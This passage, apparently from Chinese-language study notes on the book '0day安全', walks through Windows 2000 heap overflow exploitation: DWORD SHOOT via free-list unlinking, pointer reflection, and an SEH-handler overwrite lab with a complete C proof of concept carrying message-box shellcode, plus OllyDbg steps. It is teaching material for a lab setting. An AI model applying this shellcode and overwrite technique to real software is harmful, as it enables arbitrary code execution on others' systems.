åˆ°å®Œæˆ106è¡Œçš„memcpyæ“ä½œï¼Œå†è§‚å¯Ÿå¯¹æ•°æ®åŒºï¼š</p><img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_3.png" class="" title="å›¾2.2.1.3"><p>ç”±äºh1å¤„å‘ç”Ÿæº¢å‡ºï¼Œ0x688å¤„å†™å…¥çš„shellcodeä¼šè¶Šç•Œè¦†ç›–åˆ°0x758å¤„çš„å°¾å—çš„å‰åå‘æŒ‡é’ˆï¼Œå‰å‘æŒ‡é’ˆflinkè¢«ä¿®æ”¹ä¸º0x00360688ï¼Œåå‘æŒ‡é’ˆblinkè¢«ä¿®æ”¹ä¸º0x7FFDF020ã€‚ç”±äºå½“å‰å°¾å—ä¸Freelist[0]ç›¸äº’ä¸²æ¥ï¼Œè€Œh2ä¼šç”³è¯·(1+1) x 8 Byteçš„ç©ºé—´ï¼Œå½“å‰Freelist[2]ä¸­æ²¡æœ‰ç©ºé—²å—ï¼Œå› æ­¤ä¼šä»å°¾å—ä¸­â€åˆ†å‰²â€œæ‰€éœ€ç©ºé—´ç»™h2ï¼Œè¿™éœ€è¦å°†å½“å‰å°¾å—ä»Freelist[0]ä¸­â€å¸ä¸‹â€œï¼Œè€Œå‰é¢çš„å †æº¢å‡ºåˆ©ç”¨åŸç†ä¸­ä»‹ç»è¿‡ï¼Œå°†ä¸€ä¸ªç»“ç‚¹ä»åŒå‘é“¾è¡¨ä¸­â€œå¸ä¸‹â€çš„å‡½æ•°å¾ˆå¯èƒ½æ˜¯ç±»ä¼¼è¿™æ ·çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">node -&gt; <span class="built_in">blink</span> -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; <span class="built_in">blink</span> = node -&gt; <span class="built_in">blink</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œnodeå¯ç†è§£å³ä¸ºè¯¥èŠ‚ç‚¹æ•°æ®åŒºï¼ˆè€Œéå—é¦–ï¼‰çš„åœ°å€ï¼Œæœ¬ä¾‹ä¸­å¯å¦‚ä¸‹ç†è§£ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD ** node = <span class="number">0x00360758</span>; <span class="comment">//nodeæŒ‡å‘å°¾å—æ•°æ®åŒº</span></span><br><span class="line"></span><br><span class="line">nodeå€¼ä¸º<span class="number">0x00360758</span>ã€‚</span><br><span class="line">*nodeå€¼ä¸º<span class="number">0x00360688</span>ï¼Œæ˜¯è¢«è¦†ç›–åçš„å‰å‘æŒ‡é’ˆflinkã€‚</span><br><span class="line">*(node+<span class="number">4</span>)å€¼ä¸º<span class="number">0x7FFDF020</span>ï¼Œæ˜¯è¢«è¦†ç›–åçš„åå‘æŒ‡é’ˆ<span class="built_in">blink</span>ã€‚</span><br></pre></td></tr></table></figure><p>åˆ™å¦‚ä¸‹æ“ä½œå°±å¯ä»¥è¿™æ ·ç†è§£:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -&gt; flink ç­‰ä»·äº *(node+<span class="number">0</span>)ï¼Œå³*node</span><br><span class="line">node -&gt; <span class="built_in">blink</span> ç­‰ä»·äº *(node+<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œä¸Šé¢çš„ä»£ç å¯ä»¥ç†è§£ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove</span> <span class="params">(ListNode * node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*(*(node+<span class="number">4</span>)) = *node;</span><br><span class="line">*(*node+<span class="number">4</span>) = *(node+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æœ¬ä¾‹å¯æœ€ç»ˆç†è§£ä¸ºè¿›è¡Œäº†å¦‚ä¸‹æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Memory(<span class="number">0x7FFDF020</span>) = <span class="number">0x00360688</span>; <span class="comment">//P.E.B DWORD SHOOT</span></span><br><span class="line">Memory(<span class="number">0x0036068C</span>) = <span class="number">0x7FFDF020</span>; <span class="comment">//æŒ‡é’ˆåå°„</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä»£ç ä¸­ç¬¬ä¸€è¡Œå‘å†…å­˜åœ°å€0x7FFDF020å†™å…¥äº†DWORDå€¼0x00360688ï¼Œç¯¡æ”¹äº†è¯¥å¤„åŸæ¥å­˜å‚¨çš„æŒ‡å‘ä¸´ç•ŒåŒºå‡½æ•°RtlEnterCriticalSection()çš„æŒ‡é’ˆï¼Œå› æ­¤åœ¨ç¨‹åºå‡ºé”™é€€å‡ºè°ƒç”¨ExitProcess()æ—¶ï¼Œå°±ä¼šéœ€è¦åˆ°P.E.Bä¾¿å®œ0x20å¤„è·å¾—æŒ‡å‘RtlEnterCriticalSection()å‡½æ•°çš„æŒ‡é’ˆï¼Œç»“æœè·å¾—çš„æ˜¯shellcodeçš„åœ°å€0x00360688ï¼Œå› æ­¤è½¬è€Œå»æ‰§è¡Œshellcodeã€‚</p><p>ä½†è§‚å¯Ÿç¬¬äºŒè¡Œä»£ç ï¼Œä»£ç ä¼šå‘shellcodeå‰éƒ¨ç¬¬5 Byteå¤„å†™å…¥DWORD å€¼0x7FFDF020ï¼Œå› æ­¤ä½äºshellcodeä¸­çš„\x20\xF0\xFD\x7Fä¼šè¢«å½“åšæœºå™¨ç æ‰§è¡Œï¼Œè¿™æœ‰å¯èƒ½å½±å“shellcodeçš„æ­£ç¡®æ‰§è¡Œï¼Œè¿™ç§ç°è±¡å«åš_<strong>æŒ‡é’ˆåå°„</strong>_ï¼Œå¥½åœ¨æœ¬ä¾‹ä¸­è¿™äº›æŒ‡ä»¤æ— å…³ç—›ç—’â€œï¼Œå¹¶æ²¡æœ‰å½±å“shellcodeå…³é”®ä»£ç çš„æ‰§è¡Œã€‚</p><blockquote><p>ä½†å¦‚æœåœ¨ä¸ºæŸä¸ªç‰¹å®šæ¼æ´å¼€å‘exploitæ—¶ï¼ŒæŒ‡é’ˆåå°„å‘ç”Ÿä¸”ç›®æ ‡æŒ‡é’ˆä¸èƒ½å½“åšâ€æ— å…³ç—›ç—’â€œçš„æŒ‡ä»¤å®‰å…¨åœ°æ‰§è¡Œè¿‡å»ï¼Œé‚£å°±å¾—å¼€åŠ¨è„‘ç­‹ä½¿ç”¨åˆ«çš„ç›®æ ‡ï¼Œæˆ–è€…ä½¿ç”¨è·³æ¿æŠ€æœ¯ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»‹ç»äº†å¾ˆå¤šç§åˆ©ç”¨æ€è·¯ç»™å¤§å®¶çš„åŸå› â€”â€”è¦ä¸ç„¶å°±åªæœ‰è‡ªè®¤å€’éœ‰äº†ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P177</cite></footer></blockquote><h4 id="2-é€šè¿‡S-E-Hï¼ˆå¼‚å¸¸å¤„ç†ç»“æ„ä½“ï¼‰å®æ–½æ”»å‡»"><a href="#2-é€šè¿‡S-E-Hï¼ˆå¼‚å¸¸å¤„ç†ç»“æ„ä½“ï¼‰å®æ–½æ”»å‡»" class="headerlink" title="(2) é€šè¿‡S.E.Hï¼ˆå¼‚å¸¸å¤„ç†ç»“æ„ä½“ï¼‰å®æ–½æ”»å‡»"></a>(2) é€šè¿‡S.E.Hï¼ˆå¼‚å¸¸å¤„ç†ç»“æ„ä½“ï¼‰å®æ–½æ”»å‡»</h4><h5 id="1-S-E-Håˆ©ç”¨åŸç†"><a href="#1-S-E-Håˆ©ç”¨åŸç†" class="headerlink" title="1) S.E.Håˆ©ç”¨åŸç†"></a>1) S.E.Håˆ©ç”¨åŸç†</h5><blockquote><p>æ“ä½œç³»ç»Ÿæˆ–ç¨‹åºè¿è¡Œæ—¶ï¼Œéš¾å…ä¼šé‡åˆ°å„ç§å„æ ·çš„é”™è¯¯ï¼Œä¸ºäº†ä¿è¯ç³»ç»Ÿåœ¨é‡åˆ°é”™è¯¯æ—¶ä¸è‡³äºå´©æºƒäº†ï¼Œä»èƒ½å¤Ÿå¥å£®ç¨³å®šåœ°ç»§ç»­è¿è¡Œä¸‹å»ï¼ŒWindowsä¼šå¯¹è¿è¡Œåœ¨å…¶ä¸­çš„ç¨‹åºæä¾›ä¸€æ¬¡è¡¥æ•‘çš„æœºä¼šæ¥å¤„ç†é”™è¯¯ï¼Œè¿™ç§æœºåˆ¶å°±æ˜¯å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚</p><p>S.E.Hå³å¼‚å¸¸å¤„ç†ç»“æ„ä½“ï¼ˆStructure Exception Handlerï¼‰ï¼Œå®ƒæ˜¯Windowså¼‚å¸¸å¤„ç†æœºåˆ¶æ‰€é‡‡ç”¨çš„é‡è¦æ•°æ®ç»“æ„ã€‚æ¯ä¸ªS.E.HåŒ…å«ä¸¤ä¸ªDWORDæŒ‡é’ˆï¼šS.E.Hé“¾è¡¨æŒ‡é’ˆå’Œå¼‚å¸¸å¤„ç†å‡½æ•°å¥æŸ„ï¼Œå…±8ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾6.1.1æ‰€ç¤ºã€‚</p><img data-src="/tech/heap-overflow-learning-notes-2/0day_6_1_1.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P178 -&gt; å›¾6.1.1"><p>ä½œä¸ºå¯¹S.E.Hçš„åˆæ­¥äº†è§£ï¼Œæˆ‘ä»¬ç°åœ¨åªéœ€è¦çŸ¥é“ä¸€ä¸‹å‡ ä¸ªè¦ç‚¹ï¼ŒS.E.Hé“¾è¡¨å¦‚å›¾6.1.2æ‰€ç¤ºã€‚</p><p>(1) S.E.Hç»“æ„ä½“å­˜æ”¾åœ¨ç³»ç»Ÿæ ˆä¸­ã€‚<br>(2) å½“çº¿ç¨‹åˆå§‹åŒ–æ—¶ï¼Œä¼šè‡ªåŠ¨å‘æ ˆä¸­å®‰è£…ä¸€ä¸ªS.E.Hï¼Œä½œä¸ºçº¿ç¨‹é»˜è®¤çš„ä¸€åœºå¤„ç†ã€‚<br>(3) å¦‚æœç¨‹åºæºä»£ç ä¸­ä½¿ç”¨äº†<strong>try{}</strong>except{}æˆ–è€…Assertå®ç­‰å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œç¼–è¯‘å™¨å°†æœ€ç»ˆé€šè¿‡å‘å½“å‰å‡½æ•°æ ˆå¸§ä¸­å®‰è£…ä¸€ä¸ªS.E.Hæ¥å®ç°å¼‚å¸¸å¤„ç†ã€‚<br>(4) æ ˆä¸­ä¸€èˆ¬ä¼šåŒæ—¶å­˜åœ¨å¤šä¸ªS.E.H<br>(5) æ ˆä¸­çš„å¤šä¸ªS.E.Hé€šè¿‡é“¾è¡¨æŒ‡é’ˆåœ¨æ ˆå†…ç”±æ ˆé¡¶å‘æ ˆåº•ä¸²æˆå•å‘é“¾è¡¨ï¼Œä½äºé“¾è¡¨æœ€é¡¶ç«¯çš„S.E.Hé€šè¿‡T.E.Bï¼ˆçº¿ç¨‹ç¯å¢ƒå—ï¼‰0å­—èŠ‚åç§»å¤„çš„æŒ‡é’ˆæ ‡è¯†ã€‚<br>(6) å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸­æ–­ç¨‹åºï¼Œå¹¶é¦–å…ˆä»T.E.Bçš„0å­—èŠ‚åç§»å¤„å–å‡ºè·ç¦»æ ˆé¡¶æœ€è¿‘çš„S.E.Hï¼Œä½¿ç”¨å¼‚å¸¸å¤„ç†å‡½æ•°å¥æŸ„æ‰€æŒ‡å‘çš„ä»£ç æ¥å¤„ç†å¼‚å¸¸ã€‚<br>(7) å½“ç¦»â€äº‹æ•…ç°åœºâ€œæœ€è¿‘çš„å¼‚å¸¸å¤„ç†å‡½æ•°è¿è¡Œå¤±è´¥æ—¶ï¼Œå°†é¡ºç€S.E.Hé“¾è¡¨ä¾æ¬¡å°è¯•å…¶ä»–çš„å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚<br>(8) å¦‚æœç¨‹åºå®‰è£…çš„æ‰€æœ‰å¼‚å¸¸å¤„ç†å‡½æ•°éƒ½ä¸èƒ½å¤„ç†ï¼Œç³»ç»Ÿå°†é‡‡ç”¨é»˜è®¤çš„å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚é€šå¸¸ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå¼¹å‡ºä¸€ä¸ªé”™è¯¯å¯¹è¯æ¡†ï¼Œç„¶åå¼ºåˆ¶å…³é—­ç¨‹åºã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P178-179</cite></footer></blockquote><img data-src="/tech/heap-overflow-learning-notes-2/0day_6_1_2.png" class="" title="ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -&gt; P179 -&gt; å›¾6.1.2"><blockquote><p>ä»ç¨‹åºè®¾è®¡è§’åº¦æ¥è®² ï¼ŒS.E.Hå°±æ˜¯åœ¨ç³»ç»Ÿå…³é—­ç¨‹åºä¹‹å‰ï¼Œç»™ç¨‹åºä¸€ä¸ªé¢„å…ˆæ‰§è¡Œè®¾å®šçš„å›è°ƒå‡½æ•°ï¼ˆcall backï¼‰çš„æœºä¼šã€‚å¤§æ¦‚æ˜ç™½äº†S.E.Hçš„å·¥ä½œåŸç†ä¹‹å ï¼Œèªæ˜çš„è¯»è€…æœ‹å‹ä»¬å¯èƒ½å·²ç»å‘ç°äº†é—®é¢˜æ‰€åœ¨ã€‚<br>(1) S.E.Hå­˜æ”¾åœ¨æ ˆä¸­ï¼Œæ•…æº¢å‡ºç¼“å†²åŒºçš„æ•°æ®æœ‰å¯èƒ½æ·¹æ²¡S.E.Hã€‚<br>(2) ç²¾å¿ƒåˆ¶é€ çš„æº¢å‡ºæ•°æ®å¯ä»¥æŠŠS.E.Hä¸­å¼‚å¸¸å¤„ç†å‡½æ•°çš„å…¥å£åœ°å€æ›´æ”¹ä¸ºshellcodeçš„èµ·å§‹åœ°å€ã€‚<br>(3) æº¢å‡ºåé”™è¯¯çš„æ ˆå¸§æˆ–å †å—æ•°æ®å¾€å¾€ä¼šè§¦å‘å¼‚å¸¸ã€‚<br>(4) å½“Windowså¼€å§‹å¤„ç†æº¢å‡ºåçš„å¼‚å¸¸æ—¶ï¼Œä¼šé”™è¯¯åœ°æŠŠshellcodeå½“ä½œå¼‚å¸¸å¤„ç†å‡½æ•°è€Œæ‰§è¡Œã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P178-179</cite></footer></blockquote><h5 id="2-å®éªŒ-1"><a href="#2-å®éªŒ-1" class="headerlink" title="2) å®éªŒ"></a>2) å®éªŒ</h5><p>æœ¬å®éªŒé€šè¿‡æ·¹æ²¡å°¾å—å—é¦–ï¼Œæ¥è§¦å‘DWORD SHOOTä»¥ä¿®æ”¹S.E.Hä¸­ç¬¬ä¸€ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°çš„åœ°å€ï¼Œå¯¼è‡´å †æº¢å‡ºäº§ç”Ÿé”™è¯¯éœ€æ‰§è¡Œå¼‚å¸¸å¤„ç†å‡½æ•°æ—¶å®é™…å´æ‰§è¡Œäº†shellcodeã€‚</p><p>æœ¬å®éªŒä»£ç ä¸ç¬¬äº”ç« ä¸­ä»£ç ç±»ä¼¼ï¼Œå› æ­¤ä½œè€…æ²¡æœ‰åœ¨éšä¹¦ä»£ç ä¸­ç»™å‡ºï¼Œä¸‹é¢ç»™å‡ºæˆ‘è‡ªå·±ä¿®æ”¹çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight c"><figcaption><span>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P184</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x36\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">MyExceptionHandler</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line"></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow, 0x200=512</span></span><br><span class="line"></span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">__try&#123;</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç¯å¢ƒå¦‚ä¸‹ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿï¼šè¿è¡ŒäºVmwareè™šæ‹Ÿæœºï¼Œç‰ˆæœ¬Win 2K SP4 5.00.2195 EN</li><li>ç¼–è¯‘å™¨ï¼šVisual C++ 6.0</li><li>ç¼–è¯‘é€‰é¡¹ï¼šé»˜è®¤é€‰é¡¹</li><li>buildç‰ˆæœ¬ï¼šreleaseç‰ˆ</li></ul><p>å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œæœ¬ä¾‹ä¸­shellcodeä¸ä¸Šä¾‹ä¸­åŸºæœ¬ä¸€è‡´ï¼Œä¸åŒä¹‹å¤„æœ‰äºŒï¼š</p><ul><li>DWORD SHOOTçš„ç›®æ ‡åœ°å€ï¼Œå³shellcodeçš„æœ€å4 Byteï¼Œæœ¬ä¾‹ä¸­æš‚ä¸º\x90\x90\x90\x90ï¼Œä¸ºå¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€ï¼Œåœ¨è¿›è¡Œä¸€æ¬¡è°ƒè¯•ç¡®å®šåï¼Œå†æ›¿æ¢å³å¯</li><li>æœ¬ä¾‹ä¸­æ²¡æœ‰è¿›è¡Œä¸Šä¾‹ä¸­å¯¹0x7FFDF020å¤„ä¸´ç•ŒåŒºå‡½æ•°RtlEnterCriticalSection()æŒ‡é’ˆçš„ä¿®å¤ï¼Œå› ä¸ºæœ¬ä¾‹ä¸­å¹¶æ²¡æœ‰æ”¹å˜å®ƒã€‚</li></ul><p>åœ¨ç¼–è¯‘åæ‰§è¡Œç¨‹åºä¹‹å‰ï¼Œå…ˆæ”¹å˜OllyDBGè®¾ç½®ï¼Œä¸å¿½ç•¥ä»»ä½•å¼‚å¸¸ï¼Œå¦‚ä¸‹å›¾:</p><img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_1.png" class="" title="å›¾2.2.2.1"><p>æ¥ç€æ‰§è¡Œç¨‹åºï¼Œåœ¨INT3å¤„ä¸­æ–­ï¼Œè§‚å¯Ÿæ­¤æ—¶æ ˆä¸­çš„S.E.H chainï¼ŒViewèœå• -&gt; SEH chainï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_2.png" class="" title="å›¾2.2.2.2"><p>ä½†æ˜¯ï¼Œè¿™æ—¶çœ‹åˆ°çš„SEH chainä¸­å¹¶æ²¡æœ‰åœ¨æˆ‘ä»¬çš„ç¨‹åºå‘ç”Ÿå †æº¢å‡ºå¼‚å¸¸æ—¶éœ€è¦ç”¨åˆ°çš„ç¬¬ä¸€ä¸ªS.E.Hã€‚éœ€è¦æ¥ç€æ‰§è¡Œä»£ç ç›´åˆ°è°ƒç”¨è¡Œçš„HeapAlloc()å‡½æ•°ï¼Œè¿™æ—¶ä¼šå‡ºç°å¼‚å¸¸ï¼ŒæŒ‡ä»¤çª—å£ä¼šä»ç”¨æˆ·ç¨‹åºä»£ç è½¬å…¥ntdll.dllä¸­çš„å†…æ ¸ä»£ç ï¼Œæ­¤æ—¶å†è§‚å¯ŸS.E.H chainï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" class="" title="å›¾2.2.2.3"><p>è§‚å¯Ÿä¸Šå›¾ï¼Œ0x0012FF2Cå³ä¸ºå¤„ç†æœ¬ç¨‹åºç¬¬ä¸€ä¸ªå¼‚å¸¸çš„S.E.Hçš„åœ°å€ï¼Œå‰é¢ä»‹ç»è¿‡ï¼ŒS.E.Hæ˜¯ä¸ªç»“æ„ä½“ï¼Œå…¶ä¸­å…ˆååŒ…å«ç€ä¸‹ä¸€ä¸ªS.E.Hçš„æŒ‡é’ˆå’Œå¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡é’ˆï¼Œå› æ­¤ï¼Œæˆ‘ä»¬DWORD SHOOTçš„ç›®æ ‡åœ°å€ä¸º (0x0012FF2C + 4) = 0x0012FF30ã€‚</p><p>æ¥ç€ï¼Œä¿®æ”¹Cä»£ç ç¬¬18è¡Œshellcodeä¸­DWORD SHOOTçš„ç›®æ ‡åœ°å€ä¸º\x30\xFF\x12\x00ï¼Œæ³¨é‡Šæ‰ç¬¬33è¡Œçš„INT3ä¸­æ–­ï¼Œé‡æ–°ç¼–è¯‘æ‰§è¡Œï¼ŒæˆåŠŸå¼¹çª—ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡æˆ‘ä»¬ä¾ç„¶éœ€è¦æ³¨é‡Šæ‰INT3ï¼Œå¦åˆ™ç¼–è¯‘æ‰§è¡Œåè¿›å…¥OllyDBGè°ƒè¯•åè¿è¡Œï¼Œç¨‹åºæ˜¯ä¸ä¼šæ­£å¸¸å¼¹çª—çš„ï¼Œå…¶åŸå› åœ¨0dayä¹¦ä¸­åæ–‡ä¸­æœ‰æåˆ°ï¼š</p><blockquote><p>å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œç³»ç»Ÿä¼šé¡ºç€S.E.Hé“¾è¡¨æœç´¢èƒ½å¤Ÿå¤„ç†å¼‚å¸¸çš„å¥æŸ„ï¼›ä¸€æ—¦æ‰¾åˆ°äº†æ°å½“çš„å¥æŸ„ï¼Œç³»ç»Ÿä¼šå°†å·²ç»éå†è¿‡çš„S.E.Hä¸­çš„å¼‚å¸¸å¤„ç†å‡½æ•°å†è°ƒç”¨ä¸€éï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æ‰€è°“çš„unwindæ“ä½œï¼Œç¬¬äºŒè½®åœ°è°ƒç”¨å°±æ˜¯unwindè°ƒç”¨ã€‚</p><p>unwindæ“ä½œé€šè¿‡kernel32.dllä¸­çš„ä¸€ä¸ªå¯¼å‡ºå‡½æ•°RtlUnwindå®ç°ï¼Œå®é™…ä¸Škernel32.dllä¼šè½¬è€Œå†å»è°ƒç”¨ntdll.dllä¸­çš„åŒåå‡½æ•°ã€‚</p><p>æœ€åï¼Œè¿˜è¦å †æ ˆä¸­çš„å¼‚å¸¸å¤„ç†åšæœ€åä¸€ç‚¹è¡¥å……ï¼šåœ¨ä½¿ç”¨å›è°ƒå‡½æ•°ä¹‹å‰ï¼Œç³»ç»Ÿä¼šåˆ¤æ–­å½“å‰æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ï¼Œå¦‚æœå¤„äºè°ƒè¯•çŠ¶æ€ï¼Œå°†æŠŠå¼‚å¸¸äº¤ç»™è°ƒè¯•å™¨å¤„ç†ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P188-190</cite></footer></blockquote><p>ä»ä¸Šæ–‡çš„è§£é‡Šå°±å¯ä»¥æ˜ç™½ä¸ºä»€ä¹ˆæˆ‘ä»¬çš„ä»£ç ä¼šè§¦å‘å¼‚å¸¸åä¼šè¿›å…¥ntdllçš„ä»£ç æ‰§è¡Œï¼Œè€Œä¸”ä¹Ÿèƒ½è§£é‡Šä¸ºä»€ä¹ˆä¿ç•™INT3ç¼–è¯‘æ‰§è¡Œåä¸ä¼šå¼¹çª—äº†ï¼Œå› ä¸ºåœ¨å¤„ç†å¼‚å¸¸æ—¶ç³»ç»Ÿæ£€æµ‹åˆ°å½“å‰å¤„äºè°ƒè¯•å™¨ä¸­ï¼Œå› 